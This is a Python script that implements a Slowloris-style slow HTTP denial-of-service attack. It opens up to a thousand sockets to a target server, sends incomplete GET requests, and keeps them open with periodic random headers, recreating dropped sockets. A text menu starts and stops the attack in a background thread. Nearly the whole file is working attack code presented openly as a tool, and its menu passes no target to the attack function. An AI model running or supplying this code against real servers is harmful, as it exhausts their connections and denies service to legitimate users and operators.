import random
import socket
import string
import time
import sys
from threading import Thread
from colorama import init, Fore, Back, Style
import http.client

#Global variables
ongoing = True


def check_if_url_is_valid(url):
    import requests
    try:
        request = requests.get(url)
        if request.status_code == 200:
            return True
        # c = http.client.HTTPConnection(url)
        # c.request("HEAD", '')
        # if c.getresponse().status == 200:
        #     return True
    except Exception as e:
        pass
    return False


def init_request(url: str, port: int) -> socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print ('Connecting to ', url, port, ongoing)
    try:
        s.connect((url, port))

        s.send(b"GET / HTTP/1.1\r\n")
    except:
        pass
    return s


def start_slow_http_attack(url: str,
                           port: int,
                           workers_count: int = 1000,
                           sleep_: int = 10) -> None:
    global ongoing
    sockets = [init_request(url, port) for _ in range(workers_count) if ongoing]
    ongoing = True
    while ongoing:
        for i, s in enumerate(sockets):
            try:
                # check a connection by sending a random header
                header = "%s: %s\r\n" % (random.choice(string.ascii_letters), random.randint(1, 99999))
                s.send(header.encode('utf-8'))
            except socket.error:
                # recreate a dead socket
                sockets[i] = init_request(url, port)
        time.sleep(sleep_)


def stop_slow_http_attack() -> None: 
    global ongoing
    ongoing = False


def start_attack(url: str,
                port: int,
                workers_count: int = 1000) -> None:
    thread = Thread(target = start_slow_http_attack, args = (url, port, workers_count))
    thread.start()


def exit() -> None:
    global ongoing
    ongoing = False
    sys.exit(0)


def main () -> None:
    global driver

    menu_options = [{'name': "exit",                        'function': exit},
                    {'name': "start_attack",                'function': start_attack},
                    {'name': "stop_slow_http_attack",       'function': stop_slow_http_attack}]

    print()
    print('Choose the option: ')
    for item in menu_options:
        print("[ " + str(menu_options.index(item)) + " ]\t" + item["name"])
    while(True):
        choice = input("\nEnter choice number: ")
        if(choice.isdigit()):
            if(0 <= int(choice) < len(menu_options)):
                menu_options[int(choice)]['function']()
            else:
                print("Number out range!")
        else:
            print("Not a valid input!")
    print(Fore.GREEN + Style.BRIGHT + "Completed.")
    sys.exit(0)


if __name__ == '__main__':
    main()